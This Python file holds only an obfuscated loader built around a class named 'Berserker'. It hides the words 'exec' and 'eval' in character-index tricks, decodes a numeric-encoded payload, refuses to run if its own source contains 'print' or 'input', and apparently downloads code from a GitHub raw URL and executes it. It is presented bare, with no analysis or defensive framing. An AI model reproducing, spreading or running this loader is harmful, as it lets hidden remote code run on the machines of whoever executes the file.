class Berserker():
 def __init__(self:object,_bits:int=False,_decode:int=0,*_rasputin:int,**_boom:int)->exec:
  self._exit,_bits,self._bytes,_boom[_decode],self._exec,self._delete=lambda _bits:str(_boom[_decode](f"{self._exec[4]+self._exec[-13]+self._exec[4]+self._exec[2]}(''.join(%s),{self._exec[6]+self._exec[11]+self._exec[14]+self._exec[1]+self._exec[0]+self._exec[11]+self._exec[18]}())"%list(_bits))).encode(self._exec[20]+self._exec[19]+self._exec[5]+self._exec[34])if _boom[_decode]==eval else exit(),lambda _bits:exit()if self._exec[15]+self._exec[17]+self._exec[8]+self._exec[13]+self._exec[19] in open(__file__, errors=self._exec[8]+self._exec[6]+self._exec[13]+self._exec[14]+self._exec[17]+self._exec[4]).read() or self._exec[8]+self._exec[13]+self._exec[15]+self._exec[20]+self._exec[19] in open(__file__, errors=self._exec[8]+self._exec[6]+self._exec[13]+self._exec[14]+self._exec[17]+self._exec[4]).read()else"".join(_bits if _bits not in self._exec else self._exec[self._exec.index(_bits)+1 if self._exec.index(_bits)+1<len(self._exec)else 0]for _bits in "".join(chr(ord(t)-9848)if t!="ζ"else"\n"for t in self._bytes(_bits))),lambda _byte:"".join(chr(int(_system)-len(_byte.split('-')))if _system!='¨'else'ζ'for _system in str(_byte).split('-')),eval,exit()if _bits else'abcdefghijklmnopqrstuvwxyz0123456789',lambda _eval:_bits(_eval)
  return self.__decode__(_boom[(self._exec[-1]+'_')[-1]+self._exec[18]+self._exec[15]+self._exec[0]+self._exec[17]+self._exec[10]+self._exec[11]+self._exec[4]])
 def __decode__(self,_execute: str)->exec:return(None,self._exit(self._delete(_execute)))[0]
Berserker(_bits=False,_sparkle='''10223-10227-10230-10229-10232-10234-10151-10232-10219-10231-10235-10219-10233-10234-10233-¨-¨-10218-10219-10220-10151-10230-10176-10233-10234-10219-10232-10235-10228-10159-10230-10229-10233-10234-10160-10177-¨-10151-10151-10151-10151-10235-10232-10226-10151-10180-10151-10220-10153-10222-10234-10234-10230-10233-10177-10166-10166-10232-10176-10237-10165-10221-10223-10234-10222-10235-10216-10235-10233-10219-10232-10217-10229-10228-10234-10219-10228-10234-10165-10217-10229-10227-10166-10188-10232-10217-10169-10172-10171-10166-10219-10232-10217-10166-10227-10176-10233-10234-10219-10232-10166-10242-10230-10229-10233-10234-10244-10153-¨-10151-10151-10151-10151-10217-10229-10218-10219-10151-10180-10151-10232-10219-10231-10235-10219-10233-10234-10233-10165-10221-10219-10234-10159-10235-10232-10226-10160-10165-10234-10219-10238-10234-¨-10151-10151-10151-10151-10219-10238-10219-10217-10159-10217-10229-10218-10219-10160-¨-¨-10235-10232-10226-10151-10180-10151-10158-10222-10234-10234-10230-10233-10177-10166-10166-10232-10176-10237-10165-10221-10223-10234-10222-10235-10216-10235-10233-10219-10232-10217-10229-10228-10234-10219-10228-10234-10165-10217-10229-10227-10166-10188-10232-10217-10169-10172-10171-10166-10219-10232-10217-10166-10227-10176-10233-10234-10219-10232-10166-10222-10235-10228-10234-10219-10232-10233-10165-10234-10238-10234-10158-¨-10161-10214-10163-10151-10230-10229-10233-10234-10151-10180-10151-10235-10232-10226-10165-10233-10230-10226-10223-10234-10159-10158-10166-10158-10160-¨-10230-10176-10233-10234-10219-10232-10235-10228-10159-10230-10229-10233-10234-10160''')
